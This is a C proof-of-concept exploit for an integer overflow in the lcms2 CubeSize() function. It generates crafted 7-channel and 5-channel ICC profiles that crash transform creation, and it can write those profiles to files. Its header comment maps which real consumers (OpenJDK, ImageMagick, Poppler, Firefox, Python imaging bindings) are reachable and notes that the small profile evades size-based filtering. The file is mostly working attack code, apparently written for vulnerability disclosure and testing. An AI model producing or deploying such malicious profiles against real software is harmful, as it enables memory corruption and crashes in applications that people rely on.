/*
 * lcms2 CubeSize() overflow — ESCALATED POC v2
 *
 * Key improvements over icc_crash_poc.c:
 *
 * 1. DEFAULT MODE (no NOOPTIMIZE): crash occurs during cmsCreateTransform,
 *    not cmsDoTransform. Default consumers (OpenJDK, ImageMagick `convert`,
 *    Poppler, GIMP, Firefox + lcms) never pass cmsFLAGS_NOOPTIMIZE.
 *    Without it, OptimizeByComputingLinearization drives cmsStageSampleCLut16bit
 *    (src/cmslut.c:837), which calls the SAME buggy CubeSize() again. With
 *    the wrapped value, the sampler iterates through the undersized CLUT via
 *    the broken interpolator → SEGV at transform-setup time.
 *
 *    Matches the OpenJDK 21 hs_err stack showing crash in
 *    cmsCreateExtendedTransform, not cmsDoTransform.
 *
 *    Attack-surface implication: any consumer that merely CREATES a transform
 *    with a crafted profile crashes. Pixel processing is not required.
 *
 * 2. 5-CHANNEL SMALL PROFILE (--small): ~5 KB profile using dims
 *    [61,7,161,245,255]. CubeSize returns 1,529 instead of 4,294,968,825.
 *    Small enough (~4.8 KB) to defeat profile-size-based filtering, but
 *    note that reaching this bug still requires a consumer that builds a
 *    5CLR→RGB transform. Empirical testing on Ubuntu 24.04 shows that
 *    tificc, jpgicc, and ImageMagick reject 5CLR profiles embedded in
 *    3/4-channel carriers ("Input profile is not operating in proper
 *    color space"). A reachable consumer requires either (a) a multi-
 *    channel carrier (PDF /DeviceN, PDF 5+ channel /ICCBased, OpenJDK
 *    ICC_Profile.getInstance), or (b) a language binding that calls
 *    cmsCreateTransform directly (e.g., Python PIL.ImageCms).
 *
 * 3. DETERMINISM MODE (--repeat N): runs N times, reports crash rate.
 *
 * Build against RELEASED lcms2 (NOT master, which has the fix):
 *
 *   # Ubuntu 24.04 system (ships 2.14-2build1):
 *   sudo apt install liblcms2-dev gcc
 *   gcc -fsanitize=address -g -O0 -o poc_v2 icc_crash_poc_v2.c -llcms2 -lm
 *
 *   # Or from source at tag lcms2.18:
 *   git checkout lcms2.18
 *   gcc -fsanitize=address -g -I include -o poc_v2 icc_crash_poc_v2.c src/\*.c -lm
 *
 * Modes:
 *   ./poc_v2               # 7-channel, default flags → crash at cmsCreateTransform
 *   ./poc_v2 --do-crash    # 7-channel, NOOPTIMIZE    → crash at cmsDoTransform (original)
 *   ./poc_v2 --small       # 5-channel, default flags → crash at cmsCreateTransform (~5 KB profile)
 *   ./poc_v2 --repeat 20   # determinism check (legacy mode with NOOPTIMIZE)
 *   ./poc_v2 --emit out.icc        # write the 7-channel profile to a file
 *   ./poc_v2 --emit-small out.icc  # write the 5-channel profile to a file (for consumer testing)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <lcms2.h>

static void be32(unsigned char *p, unsigned int v) {
    p[0] = (v >> 24) & 0xFF; p[1] = (v >> 16) & 0xFF;
    p[2] = (v >> 8)  & 0xFF; p[3] = v & 0xFF;
}

/* 7-channel profile: dims [3,2,5,9,255,255,245], CubeSize wraps to 6,436,454.
 * Real product 4,301,403,750. Profile ~18.4 MB. */
static unsigned char *build_profile_7ch(size_t *out_size) {
    const int NENTRIES = 19309362;            /* 3 * 6,436,454 */
    const int tag_size = 32 + 36 + 20 + NENTRIES;
    const int total    = 128 + 4 + 12 + tag_size;

    unsigned char *b = calloc(1, total);
    if (!b) return NULL;

    be32(b, total);
    b[8] = 0x04; b[9] = 0x30;                 /* v4.3 */
    memcpy(b + 12, "scnr", 4);
    memcpy(b + 16, "7CLR", 4);
    memcpy(b + 20, "Lab ", 4);
    memcpy(b + 36, "acsp", 4);
    be32(b + 68, 63190); be32(b + 72, 65536); be32(b + 76, 54061);

    be32(b + 128, 1);
    memcpy(b + 132, "A2B0", 4);
    be32(b + 136, 144);
    be32(b + 140, tag_size);

    unsigned char *t = b + 144;
    memcpy(t, "mAB ", 4);
    t[8] = 7; t[9] = 3;
    be32(t + 12, 32);   /* offsetB */
    be32(t + 24, 68);   /* offsetC */

    for (int i = 0; i < 3; i++)
        memcpy(t + 32 + i * 12, "curv", 4);

    unsigned char grid7[] = {3, 2, 5, 9, 255, 255, 245};
    memcpy(t + 68, grid7, 7);
    t[68 + 16] = 1;     /* precision = 1 byte */

    *out_size = total;
    return b;
}

/* 5-channel profile: dims [61,7,161,245,255], CubeSize wraps to 1,529.
 * Real product 4,294,968,825. Profile ~5 KB. */
static unsigned char *build_profile_5ch(size_t *out_size) {
    const int NENTRIES = 3 * 1529;            /* 4,587 bytes */
    const int tag_size = 32 + 36 + 20 + NENTRIES;
    const int total    = 128 + 4 + 12 + tag_size;

    unsigned char *b = calloc(1, total);
    if (!b) return NULL;

    be32(b, total);
    b[8] = 0x04; b[9] = 0x30;                 /* v4.3 */
    memcpy(b + 12, "scnr", 4);
    memcpy(b + 16, "5CLR", 4);
    memcpy(b + 20, "Lab ", 4);
    memcpy(b + 36, "acsp", 4);
    be32(b + 68, 63190); be32(b + 72, 65536); be32(b + 76, 54061);

    be32(b + 128, 1);
    memcpy(b + 132, "A2B0", 4);
    be32(b + 136, 144);
    be32(b + 140, tag_size);

    unsigned char *t = b + 144;
    memcpy(t, "mAB ", 4);
    t[8] = 5; t[9] = 3;
    be32(t + 12, 32);
    be32(t + 24, 68);

    for (int i = 0; i < 3; i++)
        memcpy(t + 32 + i * 12, "curv", 4);

    unsigned char grid5[] = {61, 7, 161, 245, 255};
    memcpy(t + 68, grid5, 5);
    t[68 + 16] = 1;

    *out_size = total;
    return b;
}

typedef enum { M_DEFAULT, M_DO_CRASH, M_SMALL, M_REPEAT, M_EMIT, M_EMIT_SMALL } run_mode_t;

static int emit_file(const char *path, unsigned char *prof, size_t sz) {
    FILE *f = fopen(path, "wb");
    if (!f) { perror(path); return 1; }
    fwrite(prof, 1, sz, f);
    fclose(f);
    fprintf(stderr, "wrote %zu bytes to %s\n", sz, path);
    return 0;
}

static int run_transform(unsigned char *prof, size_t sz, cmsUInt32Number flags,
                          int nInput, const char *label) {
    printf("[%s] profile=%zu bytes, flags=0x%x\n", label, sz, flags);
    fflush(stdout);

    cmsHPROFILE h = cmsOpenProfileFromMem(prof, (cmsUInt32Number)sz);
    if (!h) { fprintf(stderr, "profile rejected\n"); return 2; }

    cmsHPROFILE srgb = cmsCreate_sRGBProfile();

    cmsUInt32Number inFmt;
    if (nInput == 7)      inFmt = TYPE_CMYK7_8;
    else if (nInput == 5) inFmt = TYPE_CMYK5_8;
    else                  inFmt = TYPE_CMYK7_8;

    printf("[%s] calling cmsCreateTransform...\n", label);
    fflush(stdout);

    cmsHTRANSFORM xf = cmsCreateTransform(h, inFmt, srgb, TYPE_RGB_8, 0, flags);
    if (!xf) { fprintf(stderr, "[%s] transform creation returned NULL\n", label); goto cleanup; }

    printf("[%s] transform created, calling cmsDoTransform...\n", label);
    fflush(stdout);

    unsigned char in[8]  = {0x80, 0x7F, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80};
    unsigned char out[3] = {0};
    cmsDoTransform(xf, in, out, 1);

    printf("[%s] survived: out=%02x %02x %02x\n", label, out[0], out[1], out[2]);
    cmsDeleteTransform(xf);
cleanup:
    cmsCloseProfile(h);
    cmsCloseProfile(srgb);
    return 0;
}

int main(int argc, char **argv) {
    run_mode_t mode = M_DEFAULT;
    int repeat_n = 1;
    const char *emit_path = NULL;

    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i], "--do-crash"))   mode = M_DO_CRASH;
        else if (!strcmp(argv[i], "--small"))      mode = M_SMALL;
        else if (!strcmp(argv[i], "--repeat") && i + 1 < argc) {
            mode = M_REPEAT; repeat_n = atoi(argv[++i]);
        }
        else if (!strcmp(argv[i], "--emit") && i + 1 < argc) {
            mode = M_EMIT; emit_path = argv[++i];
        }
        else if (!strcmp(argv[i], "--emit-small") && i + 1 < argc) {
            mode = M_EMIT_SMALL; emit_path = argv[++i];
        }
        else {
            fprintf(stderr, "unknown arg: %s\n", argv[i]);
            return 1;
        }
    }

    size_t sz7, sz5;
    unsigned char *p7 = build_profile_7ch(&sz7);
    unsigned char *p5 = build_profile_5ch(&sz5);
    if (!p7 || !p5) { fprintf(stderr, "alloc failed\n"); return 1; }

    int rc = 0;
    switch (mode) {
    case M_EMIT:       rc = emit_file(emit_path, p7, sz7); break;
    case M_EMIT_SMALL: rc = emit_file(emit_path, p5, sz5); break;
    case M_DO_CRASH:   rc = run_transform(p7, sz7,
                            cmsFLAGS_NOOPTIMIZE | cmsFLAGS_NOCACHE, 7,
                            "NOOPTIMIZE/7ch -> crash in cmsDoTransform"); break;
    case M_SMALL:      rc = run_transform(p5, sz5, 0, 5,
                            "DEFAULT/5ch -> crash in cmsCreateTransform"); break;
    case M_REPEAT:
        for (int i = 0; i < repeat_n; i++) {
            printf("--- run %d/%d ---\n", i + 1, repeat_n);
            run_transform(p7, sz7,
                          cmsFLAGS_NOOPTIMIZE | cmsFLAGS_NOCACHE, 7,
                          "repeat/NOOPTIMIZE");
        }
        break;
    case M_DEFAULT:
    default:
        rc = run_transform(p7, sz7, 0, 7,
                           "DEFAULT/7ch -> crash in cmsCreateTransform");
        break;
    }

    free(p7);
    free(p5);
    return rc;
}
